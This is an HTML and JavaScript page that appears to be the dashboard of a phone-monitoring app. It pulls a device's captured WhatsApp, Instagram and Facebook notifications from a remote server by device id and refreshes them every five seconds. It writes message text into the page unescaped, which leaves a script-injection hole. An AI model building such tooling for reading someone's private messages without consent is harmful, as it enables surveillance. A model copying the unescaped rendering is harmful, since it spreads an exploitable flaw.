<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Notifications - Device Control</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
            --whatsapp: #25D366;
            --instagram: #E1306C;
            --facebook: #1877F2;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 10px;
            display: flex; justify-content: center;
            height: 100vh; /* Full screen fix */
            overflow: hidden; /* Body scroll band */
        }

        /* --- Main Container (Contact Page Jaisa) --- */
        .container {
            width: 100%; max-width: 450px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 20px;
            border: 1px solid var(--glass-border);
            height: 90vh; /* Fixed height taaki scroll andar ho */
            display: flex;
            flex-direction: column;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 15px; padding-bottom: 10px;
            border-bottom: 1px solid var(--glass-border);
            flex-shrink: 0;
        }

        .back-btn {
            color: var(--text-main); font-size: 1.2rem;
            text-decoration: none; display: flex; align-items: center; justify-content: center;
            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
        }

        .page-title { font-weight: bold; font-size: 1.1rem; }

        .refresh-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border); color: white;
            width: 35px; height: 35px; border-radius: 50%; cursor: pointer;
            display: flex; align-items: center; justify-content: center;
        }

        /* --- Filters (Horizontal Scroll) --- */
        .filters {
            display: flex; gap: 8px; overflow-x: auto; 
            padding-bottom: 10px; margin-bottom: 10px;
            scrollbar-width: none; flex-shrink: 0;
        }
        .filters::-webkit-scrollbar { display: none; }

        .filter-chip {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            padding: 6px 12px; border-radius: 20px; font-size: 0.8rem; color: #ccc;
            white-space: nowrap; cursor: pointer; transition: 0.3s;
        }
        .filter-chip.active {
            background: var(--accent); color: white; border-color: var(--accent); font-weight: bold;
        }

        /* --- Notification List (Scrollable Area) --- */
        .notif-list {
            display: flex; flex-direction: column; gap: 10px;
            overflow-y: auto; /* Sirf ye area scroll karega */
            padding-right: 5px;
            flex-grow: 1; /* Baki bachi jagah lega */
        }

        /* Scrollbar Styling */
        .notif-list::-webkit-scrollbar { width: 4px; }
        .notif-list::-webkit-scrollbar-thumb { background: #444; border-radius: 10px; }

        /* --- Card Design --- */
        .notif-card {
            background: var(--glass-bg); padding: 12px;
            border-radius: 15px; display: flex; align-items: flex-start;
            border: 1px solid var(--glass-border);
        }

        .icon-box {
            width: 40px; height: 40px;
            background: #333;
            border-radius: 12px; display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem; margin-right: 12px; flex-shrink: 0;
        }

        /* App Specific Colors */
        .whatsapp-icon { background: rgba(37, 211, 102, 0.2); color: var(--whatsapp); border: 1px solid var(--whatsapp); }
        .insta-icon { background: rgba(225, 48, 108, 0.2); color: var(--instagram); border: 1px solid var(--instagram); }
        .fb-icon { background: rgba(24, 119, 242, 0.2); color: var(--facebook); border: 1px solid var(--facebook); }

        .content { flex: 1; overflow: hidden; }
        
        .row-top { display: flex; justify-content: space-between; margin-bottom: 2px; }
        .sender { font-size: 0.9rem; font-weight: bold; color: #fff; }
        .time { font-size: 0.7rem; color: var(--text-muted); }
        
        .message { 
            font-size: 0.85rem; color: #ccc; 
            white-space: nowrap; overflow: hidden; text-overflow: ellipsis; 
        }

    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Notifications</span>
            <button onclick="location.reload()" class="refresh-btn"><i class="fa-solid fa-sync"></i></button>
        </div>

        <div class="filters">
            <div class="filter-chip active" onclick="filterList('all', this)">All</div>
            <div class="filter-chip" onclick="filterList('whatsapp', this)">WhatsApp</div>
            <div class="filter-chip" onclick="filterList('instagram', this)">Instagram</div>
            <div class="filter-chip" onclick="filterList('facebook', this)">Facebook</div>
            <div class="filter-chip" onclick="filterList('others', this)">Others</div>
        </div>

        <div class="notif-list" id="notifContainer">
            <div style="text-align: center; color: #666; margin-top: 50px;">Loading...</div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;

        let allData = [];

        function renderList(data) {
            const container = document.getElementById("notifContainer");
            container.innerHTML = "";

            if (data.length === 0) {
                container.innerHTML = "<div style='text-align: center; color: #666; margin-top: 20px;'>No notifications found.</div>";
                return;
            }

            // Data ko reverse karein (Newest First)
            data.slice().reverse().forEach(item => {
                const appName = (item.appName || "System").toLowerCase();
                const title = item.title || "Unknown";
                const text = item.text || "New Notification";
                
                // Icon Logic
                let iconClass = '';
                let iconHtml = '<i class="fa-solid fa-bell"></i>';

                if (appName.includes("whatsapp")) {
                    iconClass = 'whatsapp-icon';
                    iconHtml = '<i class="fa-brands fa-whatsapp"></i>';
                } else if (appName.includes("instagram")) {
                    iconClass = 'insta-icon';
                    iconHtml = '<i class="fa-brands fa-instagram"></i>';
                } else if (appName.includes("facebook")) {
                    iconClass = 'fb-icon';
                    iconHtml = '<i class="fa-brands fa-facebook-f"></i>';
                }

                // Time Logic
                let timeDisplay = "";
                if (item.postTime) {
                    let d = new Date(parseInt(item.postTime));
                    if(!isNaN(d.getTime())) {
                        timeDisplay = `${d.getHours()}:${d.getMinutes().toString().padStart(2, '0')}`;
                    }
                }

                container.innerHTML += `
                    <div class="notif-card">
                        <div class="icon-box ${iconClass}">
                            ${iconHtml}
                        </div>
                        <div class="content">
                            <div class="row-top">
                                <span class="sender">${title}</span>
                                <span class="time">${timeDisplay}</span>
                            </div>
                            <div class="message">${text}</div>
                        </div>
                    </div>`;
            });
        }

        function filterList(type, element) {
            // Active class change
            document.querySelectorAll('.filter-chip').forEach(btn => btn.classList.remove('active'));
            element.classList.add('active');

            if (type === 'all') {
                renderList(allData);
            } else {
                const filtered = allData.filter(item => 
                    (item.appName || "").toLowerCase().includes(type)
                );
                renderList(filtered);
            }
        }

        // Fetch Data
        fetch(API_URL)
            .then(res => res.json())
            .then(data => {
                allData = data;
                renderList(data);
            })
            .catch(err => {
                document.getElementById("notifContainer").innerHTML = "<div style='text-align:center; color:red'>Failed to load data</div>";
            });

        // Auto Refresh
        setInterval(() => {
            fetch(API_URL).then(res => res.json()).then(data => {
                if(JSON.stringify(data) !== JSON.stringify(allData)) {
                    allData = data;
                    const activeFilter = document.querySelector('.filter-chip.active').innerText.toLowerCase();
                    // Simple refresh logic, filter ko maintain karne ke liye thoda complex logic chahiye hota hai,
                    // abhi ke liye bas 'all' par reset hone se bachane ke liye UI refresh tabhi karenge agar user 'all' par hai.
                    // Better yet, hum bas data update karte hain.
                    if(document.querySelector('.filter-chip.active').innerText === 'All') {
                         renderList(data);
                    }
                }
            });
        }, 5000);
    </script>
</body>
</html>
